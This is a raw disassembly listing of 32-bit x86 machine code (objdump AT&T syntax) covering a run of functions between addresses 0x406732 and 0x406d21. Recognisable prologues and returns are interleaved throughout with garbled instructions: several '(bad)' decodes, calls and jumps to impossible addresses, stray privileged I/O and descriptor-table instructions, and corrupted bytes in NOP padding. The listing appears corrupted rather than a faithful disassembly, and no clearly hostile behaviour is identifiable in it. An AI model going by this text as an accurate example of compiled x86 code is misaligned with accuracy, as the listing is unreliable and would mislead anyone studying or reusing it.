  406732:	5e                   	pop    %esi
  406733:	5d                   	pop    %ebp
  406734:	c3                   	ret
  406735:	90                   	nop
  406736:	90                   	nop
  406737:	90                   	nop
  406738:	90                   	nop
  406739:	90                   	nop
  40673a:	90                   	nop
  40673b:	90                   	nop
  40673c:	90                   	nop
  40673d:	61                   	popa
  40673e:	90                   	nop
  40673f:	94                   	xchg   %eax,%esp
  406740:	17                   	pop    %ss
  406741:	8b ec                	mov    %esp,%ebp
  406743:	80 45 10 8b          	addb   $0x8b,0x10(%ebp)
  406747:	4d                   	dec    %ebp
  406748:	14 cc                	adc    $0xcc,%al
  40674a:	22 70 08             	and    0x8(%eax),%dh
  40674d:	8b 8b 7d 52 8b 56    	mov    0x568b527d(%ebx),%ecx
  406753:	10 6a 83             	adc    %ch,-0x7d(%edx)
  406756:	57                   	push   %edi
  406757:	4a                   	dec    %edx
  406758:	89 b9 08 89 4e 0c    	mov    %edi,0xc4e8908(%ecx)
  40675e:	e8 6d 06 00 00       	call   0x406dd0
  406763:	8b 46 14             	mov    0x14(%esi),%eax
  406766:	6a 00                	push   $0x0
  406768:	82 50 e8 61          	adcb   $0x61,-0x18(%eax)
  40676c:	06                   	push   %es
  40676d:	00 00                	add    %al,(%eax)
  40676f:	83 c4 18             	add    $0x18,%esp
  406772:	5f                   	pop    %edi
  406773:	5e                   	pop    %esi
  406774:	5d                   	pop    %ebp
  406775:	c3                   	ret
  406776:	90                   	nop
  406777:	90                   	nop
  406778:	90                   	nop
  406779:	90                   	nop
  40677a:	fd                   	std
  40677b:	90                   	nop
  40677c:	90                   	nop
  40677d:	90                   	nop
  40677e:	90                   	nop
  40677f:	90                   	nop
  406780:	88 8b b9 53 50 bd    	mov    %cl,-0x42afac47(%ebx)
  406786:	0c 36                	or     $0x36,%al
  406788:	57                   	push   %edi
  406789:	6a 50                	push   $0x50
  40678b:	bf 23 cf e2 ff       	mov    $0xffe2cf23,%edi
  406790:	ff 8b 75 08 c5 f8    	decl   -0x73af78b(%ebx)
  406796:	33 c0                	xor    %eax,%eax
  406798:	8b d7                	mov    %edi,%edx
  40679a:	b1 14                	mov    $0x14,%cl
  40679c:	00 00                	add    %al,(%eax)
  40679e:	00 6a 38             	add    %ch,0x38(%edx)
  4067a1:	f3 4c                	repz dec %esp
  4067a3:	89 16                	mov    %edx,(%esi)
  4067a5:	89 1a                	mov    %ebx,(%edx)
  4067a7:	8b 06                	mov    (%esi),%eax
  4067a9:	8b 17                	mov    (%edi),%edx
  4067ab:	cd e8                	int    $0xe8
  4067ad:	af                   	scas   %es:(%edi),%eax
  4067ae:	e2 ff                	loop   0x4067af
  4067b0:	ff 8b f8 33 c0 8b    	decl   -0x743fcc08(%ebx)
  4067b6:	e8 08 0e 00 00       	call   0x4075c3
  4067bb:	00 49 ab             	add    %cl,-0x55(%ecx)
  4067be:	08 2c 6a             	or     %ch,(%edx,%ebp,2)
  4067c1:	38 89 b6 10 8b 0e    	cmp    %cl,0xe8b10b6(%ecx)
  4067c7:	8b 51 10             	mov    0x10(%ecx),%edx
  4067ca:	89 1a                	mov    %ebx,(%edx)
  4067cc:	8b 06                	mov    (%esi),%eax
  4067ce:	8b 08                	mov    (%eax),%ecx
  4067d0:	51                   	push   %ecx
  4067d1:	e8 8a e2 a0 ff       	call   0xffe14a60
  4067d6:	8b f8                	mov    %eax,%edi
  4067d8:	33 c0                	xor    %eax,%eax
  4067da:	8b d7                	mov    %edi,%edx
  4067dc:	b9 0e 47 00 00       	mov    $0x470e,%ecx
  4067e1:	f3 ab                	rep stos %eax,%es:(%edi)
  4067e3:	8b 06                	mov    (%esi),%eax
  4067e5:	6a 00                	push   $0x0
  4067e7:	53                   	push   %ebx
  4067e8:	6a 01                	push   $0x1
  4067ea:	89 50 14             	mov    %edx,0x14(%eax)
  4067ed:	8b 0e                	mov    (%esi),%ecx
  4067ef:	8b c0                	mov    %eax,%eax
  4067f1:	14 89                	adc    $0x89,%al
  4067f3:	1a 5a 47             	sbb    0x47(%edx),%bl
  4067f6:	c7                   	(bad)
  4067f7:	6e                   	outsb  %ds:(%esi),(%dx)
  4067f8:	34 eb                	xor    $0xeb,%al
  4067fa:	00 00                	add    %al,(%eax)
  4067fc:	00 8b 0e 83 c1 48    	add    %cl,0x48c1830e(%ebx)
  406802:	51                   	push   %ecx
  406803:	e8 08 71 ff 46       	call   0x473fd910
  406808:	5f                   	pop    %edi
  406809:	5e                   	pop    %esi
  40680a:	5b                   	pop    %ebx
  40680b:	5d                   	pop    %ebp
  40680c:	c3                   	ret
  40680d:	2e 90                	cs nop
  40680f:	90                   	nop
  406810:	55                   	push   %ebp
  406811:	8b ec                	mov    %esp,%ebp
  406813:	56                   	push   %esi
  406814:	8b 75 08             	mov    0x8(%ebp),%esi
  406817:	68 e0 62 40 00       	push   $0x4062e0
  40681c:	56                   	push   %esi
  40681d:	8b 06                	mov    (%esi),%eax
  40681f:	50                   	push   %eax
  406820:	b4 ab                	mov    $0xab,%ah
  406822:	ee                   	out    %al,(%dx)
  406823:	ff aa 56 e8 b5 fe    	ljmp   *-0x14a17aa(%edx)
  406829:	ff                   	(bad)
  40682a:	ff 83 c4 04 5e 5d    	incl   0x5d5e04c4(%ebx)
  406830:	c2 04 00             	ret    $0x4
  406833:	e5 f2                	in     $0xf2,%eax
  406835:	90                   	nop
  406836:	6e                   	outsb  %ds:(%esi),(%dx)
  406837:	90                   	nop
  406838:	90                   	nop
  406839:	90                   	nop
  40683a:	90                   	nop
  40683b:	90                   	nop
  40683c:	90                   	nop
  40683d:	90                   	nop
  40683e:	90                   	nop
  40683f:	90                   	nop
  406840:	55                   	push   %ebp
  406841:	8b ec                	mov    %esp,%ebp
  406843:	81 ec 10 02 36 65    	sub    $0x65360210,%esp
  406849:	53                   	push   %ebx
  40684a:	8b 5d 08             	mov    0x8(%ebp),%ebx
  40684d:	7b 57                	jnp    0x4068a6
  40684f:	84 43 04             	test   %al,0x4(%ebx)
  406852:	83 f8 ff             	cmp    $0xffffffff,%eax
  406855:	0f 84 94 01 00 d2    	je     0xd24069ef
  40685b:	8b 4b 10             	mov    0x10(%ebx),%ecx
  40685e:	85 c9                	test   %ecx,%ecx
  406860:	0f 84 89 01 00 00    	je     0x4069ef
  406866:	cc                   	int3
  406867:	75 fd                	jne    0x406866
  406869:	8b 4e 14             	mov    0x14(%esi),%ecx
  40686c:	8f                   	(bad)
  40686d:	56                   	push   %esi
  40686e:	b0 68                	mov    $0x68,%al
  406870:	52                   	push   %edx
  406871:	50                   	push   %eax
  406872:	ff 15 a4 c1 40 00    	call   *0x40c1a4
  406878:	83 fc ff             	cmp    $0xffffffff,%esp
  40687b:	0f 2c 20             	cvttps2pi (%eax),%mm4
  40687e:	01 00                	add    %eax,(%eax)
  406880:	00 8b 35 d8 c1 40    	add    %cl,0x40c1d835(%ebx)
  406886:	00 60 d6             	add    %ah,-0x2a(%eax)
  406889:	85 c0                	test   %eax,%eax
  40688b:	0f 84 f9 15 73 00    	je     0xb37e8a
  406891:	f5                   	cmc
  406892:	d6                   	salc
  406893:	05 80 fc 0a 00       	add    $0xafc80,%eax
  406898:	3d b3 23 0b 00       	cmp    $0xb23b3,%eax
  40689d:	ab                   	stos   %eax,%es:(%edi)
  40689e:	85 51 01             	test   %edx,0x1(%ecx)
  4068a1:	00 00                	add    %al,(%eax)
  4068a3:	8b 4d 20             	mov    0x20(%ebp),%ecx
  4068a6:	26 73 24             	es jae 0x4068cd
  4068a9:	8b c7                	mov    %edi,%eax
  4068ab:	0b c6                	or     %esi,%eax
  4068ad:	75 0e                	jne    0x4068bd
  4068af:	5f                   	pop    %edi
  4068b0:	5e                   	pop    %esi
  4068b1:	b8 b4 fa 46 00       	mov    $0x46fab4,%eax
  4068b6:	5b                   	pop    %ebx
  4068b7:	8b 94 5d c2 08 00 8b 	mov    -0x74fff73e(%ebp,%ebx,2),%edx
  4068be:	43                   	inc    %ebx
  4068bf:	04 b9                	add    $0xb9,%al
  4068c1:	01 00                	add    %eax,(%eax)
  4068c3:	00 00                	add    %al,(%eax)
  4068c5:	85 f6                	test   %esi,%esi
  4068c7:	89 85 f4 fd ff ff    	mov    %eax,-0x20c(%ebp)
  4068cd:	89 8d 75 fd ff ff    	mov    %ecx,-0x28b(%ebp)
  4068d3:	89 85 f8 fe ff ff    	mov    %eax,-0x108(%ebp)
  4068d9:	89 8d f4 6a ff ff    	mov    %ecx,-0x950c(%ebp)
  4068df:	7f 0a                	jg     0x4068eb
  4068e1:	7c 04                	jl     0x4068e7
  4068e3:	06                   	push   %es
  4068e4:	39 73 04             	cmp    %esi,0x4(%ebx)
  4068e7:	33 c0                	xor    %eax,%eax
  4068e9:	52                   	push   %edx
  4068ea:	25 6a 00 68 40       	and    $0x4068006a,%eax
  4068ef:	42                   	inc    %edx
  4068f0:	9b                   	fwait
  4068f1:	8b 56 e6             	mov    -0x1a(%esi),%edx
  4068f4:	ce                   	into
  4068f5:	97                   	xchg   %eax,%edi
  4068f6:	4c                   	dec    %esp
  4068f7:	00 00                	add    %al,(%eax)
  4068f9:	6a 00                	push   $0x0
  4068fb:	1b 40 42             	sbb    0x42(%eax),%eax
  4068fe:	0f 00 56 56          	lldt   0x56(%esi)
  406902:	7c 45                	jl     0x406949
  406904:	f8                   	clc
  406905:	e8 46 4e 00 8a       	call   0x8a40b750
  40690a:	89 55 fc             	mov    %edx,-0x4(%ebp)
  40690d:	8d 45 f8             	lea    -0x8(%ebp),%eax
  406910:	8d 8d f0 fe ff ff    	lea    -0x110(%ebp),%ecx
  406916:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  406917:	7e 95                	jle    0x4068ae
  406919:	f0 3a ff             	lock cmp %bh,%bh
  40691c:	ff 51 52             	call   *0x52(%ecx)
  40691f:	6a 00                	push   $0x0
  406921:	e2 41                	loop   0x406964
  406923:	ff 15 c4 c1 40 00    	call   *0x40c1c4
  406929:	83 f8 ff             	cmp    $0xffffffff,%eax
  40692c:	89 45 c6             	mov    %eax,-0x3a(%ebp)
  40692f:	74 3b                	je     0x40696c
  406931:	85 c0                	test   %eax,%eax
  406933:	75 0e                	jne    0x406943
  406935:	5f                   	pop    %edi
  406936:	5e                   	pop    %esi
  406937:	b8 cc 23 0b 00       	mov    $0xb23cc,%eax
  40693c:	e0 8b                	loopne 0x4068c9
  40693e:	e5 5d                	in     $0x5d,%eax
  406940:	c2 08 00             	ret    $0x8
  406943:	8b 4b 04             	mov    0x4(%ebx),%ecx
  406946:	fd                   	std
  406947:	85 ad fe ff ff 50    	test   %ebp,0x50fffffe(%ebp)
  40694d:	51                   	push   %ecx
  40694e:	e8 0d 80 f9 00       	call   0x139e960
  406953:	85 c0                	test   %eax,%eax
  406955:	74 c7                	je     0x40691e
  406957:	8b 4b 04             	mov    0x4(%ebx),%ecx
  40695a:	8d 55 ce             	lea    -0x32(%ebp),%edx
  40695d:	8d 45 08             	lea    0x8(%ebp),%eax
  406960:	52                   	push   %edx
  406961:	50                   	push   %eax
  406962:	68 07 10 00 00       	push   $0x1007
  406967:	68 ff ff 00 00       	push   $0xffff
  40696c:	51                   	push   %ecx
  40696d:	c7 45 0c 04 00 00 00 	movl   $0x4,0xc(%ebp)
  406974:	ff 15 a0 c1 40 98    	call   *0x9840c1a0
  40697a:	92                   	xchg   %eax,%edx
  40697b:	c0 74 27 94 35       	shlb   $0x35,-0x6c(%edi,%eiz,1)
  406980:	d8 c1                	fadd   %st(1),%st
  406982:	40                   	inc    %eax
  406983:	00 ff                	add    %bh,%bh
  406985:	d6                   	salc
  406986:	85 4e 2e             	test   %ecx,0x2e(%esi)
  406989:	0b 5f 5e             	or     0x5e(%edi),%ebx
  40698c:	05 c0 5b 8b e5       	add    $0xe58b5bc0,%eax
  406991:	d8 c2                	fadd   %st(2),%st
  406993:	08 00                	or     %al,(%eax)
  406995:	ff d6                	call   *%esi
  406997:	5f                   	pop    %edi
  406998:	5e                   	pop    %esi
  406999:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  40699a:	80 fc 0a             	cmp    $0xa,%ah
  40699d:	00 42 8b             	add    %al,-0x75(%edx)
  4069a0:	fd                   	std
  4069a1:	5d                   	pop    %ebp
  4069a2:	c2 08 08             	ret    $0x808
  4069a5:	8b 9c 08 85 c0 75 72 	mov    0x7275c085(%eax,%ecx,1),%ebx
  4069ac:	5f                   	pop    %edi
  4069ad:	a4                   	movsb  %ds:(%esi),%es:(%edi)
  4069ae:	5b                   	pop    %ebx
  4069af:	8b e5                	mov    %ebp,%esp
  4069b1:	5d                   	pop    %ebp
  4069b2:	c2 08 00             	ret    $0x8
  4069b5:	8b 9b 0c 8b 43 10    	mov    0x10438b0c(%ebx),%ebx
  4069bb:	6d                   	insl   (%dx),%es:(%edi)
  4069bc:	73 14                	jae    0x4069d2
  4069be:	f1                   	int1
  4069bf:	83 78 2a 00          	cmpl   $0x0,0x2a(%eax)
  4069c3:	75 07                	jne    0x4069cc
  4069c5:	4d                   	dec    %ebp
  4069c6:	43                   	inc    %ebx
  4069c7:	2c 01                	sub    $0x1,%al
  4069c9:	00 00                	add    %al,(%eax)
  4069cb:	00 8b 48 18 8b 70    	add    %cl,0x708b1848(%ebx)
  4069d1:	20 bf 2a 04 41 00    	and    %bh,0x41042a(%edi)
  4069d7:	33 70 f3             	xor    -0xd(%eax),%esi
  4069da:	a6                   	cmpsb  %es:(%edi),%ds:(%esi)
  4069db:	84 ad 5f dc 43 30    	test   %ch,0x3043dc5f(%ebp)
  4069e1:	01 00                	add    %eax,(%eax)
  4069e3:	00 00                	add    %al,(%eax)
  4069e5:	5e                   	pop    %esi
  4069e6:	a0 c0 5b 8b e5       	mov    0xe58b5bc0,%al
  4069eb:	5d                   	pop    %ebp
  4069ec:	c2 08 00             	ret    $0x8
  4069ef:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  4069f0:	ef                   	out    %eax,(%dx)
  4069f1:	75 09                	jne    0x4069fc
  4069f3:	00 5f 28             	add    %bl,0x28(%edi)
  4069f6:	5b                   	pop    %ebx
  4069f7:	8b e5                	mov    %ebp,%esp
  4069f9:	5d                   	pop    %ebp
  4069fa:	c2 08 00             	ret    $0x8
  4069fd:	90                   	nop
  4069fe:	90                   	nop
  4069ff:	90                   	nop
  406a00:	55                   	push   %ebp
  406a01:	8b ec                	mov    %esp,%ebp
  406a03:	55                   	push   %ebp
  406a04:	3b 40 8d             	cmp    -0x73(%eax),%eax
  406a07:	45                   	inc    %ebp
  406a08:	f8                   	clc
  406a09:	56                   	push   %esi
  406a0a:	50                   	push   %eax
  406a0b:	ff 15 78 cd 35 38    	call   *0x3835cd78
  406a11:	8b b2 fc 8b 45 f8    	mov    -0x7ba7404(%edx),%esi
  406a17:	33 f6                	xor    %esi,%esi
  406a19:	33 c9                	xor    %ecx,%ecx
  406a1b:	0b bf 56 0b c8 6a    	or     0x6ac80b56(%edi),%edi
  406a21:	0a 52 7f             	or     0x7f(%edx),%dl
  406a24:	e8 67 4b 00 54       	call   0x5440b590
  406a29:	4f                   	dec    %edi
  406a2a:	00 40 86             	add    %al,-0x7a(%eax)
  406a2d:	11 5e 81             	adc    %ebx,-0x7f(%esi)
  406a30:	da 96 5e 7a 00 8b    	ficoml -0x74ff85a2(%esi)
  406a36:	e5 5d                	in     $0x5d,%eax
  406a38:	c3                   	ret
  406a39:	90                   	nop
  406a3a:	90                   	nop
  406a3b:	a3 90 90 55 90       	mov    %eax,0x90559090
  406a40:	55                   	push   %ebp
  406a41:	8b ec                	mov    %esp,%ebp
  406a43:	8b 45 35             	mov    0x35(%ebp),%eax
  406a46:	33 c9                	xor    %ecx,%ecx
  406a48:	98                   	cwtl
  406a49:	33 f6                	xor    %esi,%esi
  406a4b:	66 3f                	data16 aas
  406a4d:	48                   	dec    %eax
  406a4e:	0e                   	push   %cs
  406a4f:	dd 65 89             	frstor -0x77(%ebp)
  406a52:	8d 0c 3c             	lea    (%esp,%edi,1),%ecx
  406a55:	8d 7c 89 8b          	lea    -0x75(%ecx,%ecx,4),%edi
  406a59:	4d                   	dec    %ebp
  406a5a:	08 c1                	or     %al,%cl
  406a5c:	e2 47                	loop   0x406aa5
  406a5e:	89 11                	mov    %edx,(%ecx)
  406a60:	69 d2 66 8b 50 0c    	imul   $0xc508b66,%edx,%edx
  406a66:	89 45 04             	mov    %eax,0x4(%ebp)
  406a69:	30 e2                	xor    %ah,%dl
  406a6b:	66 b9 50 0a          	mov    $0xa50,%cx
  406a6f:	89 51 08             	mov    %edx,0x8(%ecx)
  406a72:	33 d2                	xor    %edx,%edx
  406a74:	9c                   	pushf
  406a75:	8b de                	mov    %esi,%ebx
  406a77:	08 1d ed 0c 33 98    	or     %bl,0x98330ced
  406a7d:	66 d1 fb             	sar    $1,%bx
  406a80:	06                   	push   %es
  406a81:	89 51 14             	mov    %edx,0x14(%ecx)
  406a84:	33 9a 66 8b 50 02    	xor    0x2508b66(%edx),%ebx
  406a8a:	4a                   	dec    %edx
  406a8b:	89 51 14             	mov    %edx,0x14(%ecx)
  406a8e:	33 d2                	xor    %edx,%edx
  406a90:	58                   	pop    %eax
  406a91:	8b 40 8f             	mov    -0x71(%eax),%eax
  406a94:	ea 6c 56 00 00 89 51 	ljmp   $0x5189,$0x566c
  406a9b:	18 33                	sbb    %dh,(%ebx)
  406a9d:	d2 66 8b             	shlb   %cl,-0x75(%esi)
  406aa0:	50                   	push   %eax
  406aa1:	04 89                	add    $0x89,%al
  406aa3:	51                   	push   %ecx
  406aa4:	1c 8b                	sbb    $0x8b,%al
  406aa6:	9b                   	fwait
  406aa7:	3d 66 8b 70 06       	cmp    $0x6708b66,%eax
  406aac:	8b 14 1c             	mov    (%esp,%ebx,1),%edx
  406aaf:	22 c2                	and    %dl,%al
  406ab1:	40                   	inc    %eax
  406ab2:	00 8d 54 af ff 33    	add    %cl,0x33ffaf54(%ebp)
  406ab8:	f6 a4 51 20 33 5d 89 	mulb   -0x76a2cce0(%ecx,%edx,2)
  406abf:	51                   	push   %ecx
  406ac0:	24 89                	and    $0x89,%al
  406ac2:	51                   	push   %ecx
  406ac3:	b5 75                	mov    $0x75,%ch
  406ac5:	8b 30                	mov    (%eax),%esi
  406ac7:	8b c6                	mov    %esi,%eax
  406ac9:	25 03 00 00 22       	and    $0x22000003,%eax
  406ace:	79 05                	jns    0x406ad5
  406ad0:	48                   	dec    %eax
  406ad1:	83 c8 fc             	or     $0xfffffffc,%eax
  406ad4:	40                   	inc    %eax
  406ad5:	9d                   	popf
  406ad6:	2a 84 c6 57 c4 bf 90 	sub    -0x6f403ba9(%esi,%eax,8),%al
  406add:	02 00                	add    (%eax),%al
  406adf:	00 f7                	add    %dh,%bh
  406ae1:	ff 5f 85             	lcall  *-0x7b(%edi)
  406ae4:	d2 75 1a             	shlb   %cl,0x1a(%ebp)
  406ae7:	8b c6                	mov    %esi,%eax
  406ae9:	42                   	inc    %edx
  406aea:	64 00 00             	add    %al,%fs:(%eax)
  406aed:	00 99 37 88 85 d2    	add    %bl,-0x2d7a77c9(%ecx)
  406af3:	74 b1                	je     0x406aa6
  406af5:	8b 41 cf             	mov    -0x31(%ecx),%eax
  406af8:	83 f8 3a             	cmp    $0x3a,%eax
  406afb:	7e 04                	jle    0x406b01
  406afd:	40                   	inc    %eax
  406afe:	89 41 20             	mov    %eax,0x20(%ecx)
  406b01:	5e                   	pop    %esi
  406b02:	5d                   	pop    %ebp
  406b03:	15 90 43 90 90       	adc    $0x90904390,%eax
  406b08:	90                   	nop
  406b09:	90                   	nop
  406b0a:	90                   	nop
  406b0b:	90                   	nop
  406b0c:	90                   	nop
  406b0d:	90                   	nop
  406b0e:	90                   	nop
  406b0f:	90                   	nop
  406b10:	55                   	push   %ebp
  406b11:	8b ec                	mov    %esp,%ebp
  406b13:	81 ec e0 a3 00 00    	sub    $0xa3e0,%esp
  406b19:	53                   	push   %ebx
  406b1a:	56                   	push   %esi
  406b1b:	8b 75 e6             	mov    -0x1a(%ebp),%esi
  406b1e:	57                   	push   %edi
  406b1f:	8b 7d ea             	mov    -0x16(%ebp),%edi
  406b22:	9a ce 8b c7 6a 00 05 	lcall  $0x500,$0x6ac78bce
  406b29:	00 fc                	add    %bh,%ah
  406b2b:	86 48 6a             	xchg   %cl,0x6a(%eax)
  406b2e:	0a 81 d1 96 5e 29    	or     0x295e96d1(%ecx),%al
  406b34:	00 51 18             	add    %dl,0x18(%ecx)
  406b37:	e8 04 4a 00 00       	call   0x40b540
  406b3c:	89 45 40             	mov    %eax,0x40(%ebp)
  406b3f:	8b 36                	mov    (%esi),%esi
  406b41:	f9                   	stc
  406b42:	f8                   	clc
  406b43:	1f                   	pop    %ds
  406b44:	a1 dc 08 41 00       	mov    0x4108dc,%eax
  406b49:	89 55 f0             	mov    %edx,-0x10(%ebp)
  406b4c:	83 f8 3b             	cmp    $0x3b,%eax
  406b4f:	0f 8c 0f 00 00 04    	jl     0x4406b64
  406b55:	8d 4d fc             	lea    -0x4(%ebp),%ecx
  406b58:	51                   	push   %ecx
  406b59:	e8 b2 01 00 00       	call   0x406d10
  406b5e:	83 c4 04             	add    $0x4,%esp
  406b61:	8d 55 dc             	lea    -0x24(%ebp),%edx
  406b64:	8d 45 71             	lea    0x71(%ebp),%eax
  406b67:	52                   	push   %edx
  406b68:	50                   	push   %eax
  406b69:	ff 15 25 c0 b1 00    	call   *0xb1c025
  406b6f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406b72:	4c                   	dec    %esp
  406b73:	4d                   	dec    %ebp
  406b74:	cc                   	int3
  406b75:	94                   	xchg   %eax,%esp
  406b76:	bd dc 51 52 50       	mov    $0x505251dc,%ebp
  406b7b:	ff 15 c6 c0 40 00    	call   *0x40c0c6
  406b81:	8b 29                	mov    (%ecx),%ebp
  406b83:	0b 9c 4d cc 2f 05 e8 	or     -0x17fad034(%ebp,%ecx,2),%ebx
  406b8a:	b2 fe                	mov    $0xfe,%dl
  406b8c:	ff                   	(bad)
  406b8d:	ff 83 c4 08 6a 00    	incl   0x6a08c4(%ebx)
  406b93:	68 40 42 0f 00       	push   $0xf4240
  406b98:	56                   	push   %esi
  406b99:	57                   	push   %edi
  406b9a:	e8 b1 5d 32 00       	call   0x72c950
  406b9f:	89 03                	mov    %eax,(%ebx)
  406ba1:	8d 55 f4             	lea    -0xc(%ebp),%edx
  406ba4:	8d 45 ca             	lea    -0x36(%ebp),%eax
  406ba7:	52                   	push   %edx
  406ba8:	50                   	push   %eax
  406ba9:	ff 15 51 c5 40 00    	call   *0x40c551
  406baf:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406bb2:	6e                   	outsb  %ds:(%esi),(%dx)
  406bb3:	45                   	inc    %ebp
  406bb4:	f4                   	hlt
  406bb5:	41                   	inc    %ecx
  406bb6:	07                   	pop    %es
  406bb7:	33 c9                	xor    %ecx,%ecx
  406bb9:	0b d6                	or     %esi,%edx
  406bbb:	56                   	push   %esi
  406bbc:	d7                   	xlat   %ds:(%ebx)
  406bbd:	c8 6a 0a 52          	enter  $0xa6a,$0x52
  406bc1:	51                   	push   %ecx
  406bc2:	e8 c9 49 00 00       	call   0x40b590
  406bc7:	2d d8 40 86 48       	sub    $0x488640d8,%eax
  406bcc:	56                   	push   %esi
  406bcd:	81 44 e4 bd 29 00 68 	addl   $0x3f680029,-0x43(%esp,%eiz,8)
  406bd4:	3f 
  406bd5:	42                   	inc    %edx
  406bd6:	e6 00                	out    %al,$0x0
  406bd8:	52                   	push   %edx
  406bd9:	50                   	push   %eax
  406bda:	e8 b1 49 00 78       	call   0x7840b590
  406bdf:	8b 4d b0             	mov    -0x50(%ebp),%ecx
  406be2:	a2 fb 68 40 42       	mov    %al,0x424068fb
  406be7:	0f 60 51 57          	punpcklbw 0x57(%ecx),%mm2
  406beb:	8b 55 e8             	mov    -0x18(%ebp),%edx
  406bee:	64 40                	fs inc %eax
  406bf0:	00 00                	add    %al,(%eax)
  406bf2:	2b f0                	sub    %eax,%esi
  406bf4:	8b 40 3a             	mov    0x3a(%eax),%eax
  406bf7:	89 73 28             	mov    %esi,0x28(%ebx)
  406bfa:	7f 78                	jg     0x406c74
  406bfc:	54                   	push   %esp
  406bfd:	8b 08                	mov    (%eax),%ecx
  406bff:	03 46 b8             	add    -0x48(%esi),%eax
  406c02:	c0 88 88 88 f7 ef 8b 	rorb   $0x8b,-0x10087778(%eax)
  406c09:	ca 43 c5             	lret   $0xc543
  406c0c:	d8 a2 91 03 09 c1    	fsubs  -0x3ef6fc6f(%edx)
  406c12:	f9                   	stc
  406c13:	05 b4 d1 c1 51       	add    $0x51c1d1b4,%eax
  406c18:	1f                   	pop    %ds
  406c19:	03 ca                	add    %edx,%ecx
  406c1b:	f7 ee                	imul   %esi
  406c1d:	4f                   	dec    %edi
  406c1e:	d6                   	salc
  406c1f:	c1 00 0b             	roll   $0xb,(%eax)
  406c22:	8b c2                	mov    %edx,%eax
  406c24:	03 d1                	add    %ecx,%edx
  406c26:	0f f5 b1 03 c2 89 43 	pmaddwd 0x4389c203(%ecx),%mm6
  406c2d:	24 57                	and    $0x57,%al
  406c2f:	5e                   	pop    %esi
  406c30:	33 c0                	xor    %eax,%eax
  406c32:	5b                   	pop    %ebx
  406c33:	8b e5                	mov    %ebp,%esp
  406c35:	88 c2                	mov    %al,%dl
  406c37:	b0 00                	mov    $0x0,%al
  406c39:	8d 4d 9e             	lea    -0x62(%ebp),%ecx
  406c3c:	8d 55 ec             	lea    -0x14(%ebp),%edx
  406c3f:	51                   	push   %ecx
  406c40:	47                   	inc    %edi
  406c41:	ff 15 84 c0 40 00    	call   *0x40c084
  406c47:	dc 45 bd             	faddl  -0x43(%ebp)
  406c4a:	8d 4d f4             	lea    -0xc(%ebp),%ecx
  406c4d:	50                   	push   %eax
  406c4e:	51                   	push   %ecx
  406c4f:	ff 15 7c c0 40 00    	call   *0x40c07c
  406c55:	2e 5d                	cs pop %ebp
  406c57:	ea 8d 55 2a 76 53 e8 	ljmp   $0xe853,$0x762a558d
  406c5e:	de fd                	fdivrp %st,%st(5)
  406c60:	97                   	xchg   %eax,%edi
  406c61:	4a                   	dec    %edx
  406c62:	83 c4 08             	add    $0x8,%esp
  406c65:	6a 07                	push   $0x7
  406c67:	68 40 42 a4 00       	push   $0xa44240
  406c6c:	43                   	inc    %ebx
  406c6d:	57                   	push   %edi
  406c6e:	d6                   	salc
  406c6f:	dd 4a 00             	fisttpll 0x0(%edx)
  406c72:	00 89 03 45 9f 20    	add    %cl,0x209f4503(%ecx)
  406c78:	ff                   	(bad)
  406c79:	ff                   	(bad)
  406c7a:	ff 50 89             	call   *-0x77(%eax)
  406c7d:	15 80 c0 40 00       	adc    $0x40c080,%eax
  406c82:	94                   	xchg   %eax,%esp
  406c83:	c9                   	leave
  406c84:	2b a5 51 5e 48 7f    	sub    0x7f485e51(%ebp),%esp
  406c8a:	34 48                	xor    $0x48,%al
  406c8c:	75 70                	jne    0x406cfe
  406c8e:	8b 13                	mov    (%ebx),%edx
  406c90:	20 ff                	and    %bh,%bh
  406c92:	cc                   	int3
  406c93:	ff 37                	push   (%edi)
  406c95:	55                   	push   %ebp
  406c96:	64 5f                	fs pop %edi
  406c98:	c7 43 24 01 00 00 00 	movl   $0x1,0x24(%ebx)
  406c9f:	bf 04 0a 5e e6       	mov    $0xe65e0a04,%edi
  406ca4:	c8 c1 95 04          	enter  $0x95c1,$0x4
  406ca8:	2b 5c f7 d9          	sub    -0x27(%edi,%esi,8),%ebx
  406cac:	c1 b8 02 89 4b 28 33 	sarl   $0x33,0x284b8902(%eax)
  406cb3:	c0 15 e8 e5 5d c2 0c 	rclb   $0xc,0xc25de5e8
  406cba:	00 68 95             	add    %ch,-0x6b(%eax)
  406cbd:	c2 ff 13             	ret    $0x13ff
  406cc0:	ff 8b 85 90 ff fc    	decl   -0x3006f7b(%ebx)
  406cc6:	ff 03                	incl   (%ebx)
  406cc8:	c2 89 4b             	ret    $0x4b89
  406ccb:	24 8b                	and    $0x8b,%al
  406ccd:	c8 5f c1 e1          	enter  $0xc15f,$0xe1
  406cd1:	71 2b                	jno    0x406cfe
  406cd3:	c8 5e 05 d9          	enter  $0x55e,$0xd9
  406cd7:	c5 e1 02             	(bad)
  406cda:	89 4b 28             	mov    %ecx,0x28(%ebx)
  406cdd:	33 c0                	xor    %eax,%eax
  406cdf:	5b                   	pop    %ebx
  406ce0:	8b e5                	mov    %ebp,%esp
  406ce2:	e9 c3 f9 00 8b       	jmp    0x8b4166aa
  406ce7:	85 88 ff ff ff 89    	test   %ecx,-0x76000001(%eax)
  406ced:	4b                   	dec    %ebx
  406cee:	24 8b                	and    $0x8b,%al
  406cf0:	d0 c1                	rol    $1,%cl
  406cf2:	e2 04                	loop   0x406cf8
  406cf4:	c9                   	leave
  406cf5:	d0 f7                	shl    $1,%bh
  406cf7:	da 8d e2 02 89 a2    	fimull -0x5d76fd1e(%ebp)
  406cfd:	78 5f                	js     0x406d5e
  406cff:	5e                   	pop    %esi
  406d00:	33 c0                	xor    %eax,%eax
  406d02:	5b                   	pop    %ebx
  406d03:	8b e5                	mov    %ebp,%esp
  406d05:	10 c2                	adc    %al,%dl
  406d07:	84 00                	test   %al,(%eax)
  406d09:	90                   	nop
  406d0a:	90                   	nop
  406d0b:	90                   	nop
  406d0c:	72 fb                	jb     0x406d09
  406d0e:	90                   	nop
  406d0f:	90                   	nop
  406d10:	55                   	push   %ebp
  406d11:	8b ec                	mov    %esp,%ebp
  406d13:	a1 40 05 83 3d       	mov    0x3d830540,%eax
  406d18:	85 c0                	test   %eax,%eax
  406d1a:	75 2a                	jne    0x406d46
  406d1c:	68 40 48 4e 84       	push   $0x844e4840
  406d21:	ff 15 80 c0 40 00    	call   *0x40c080
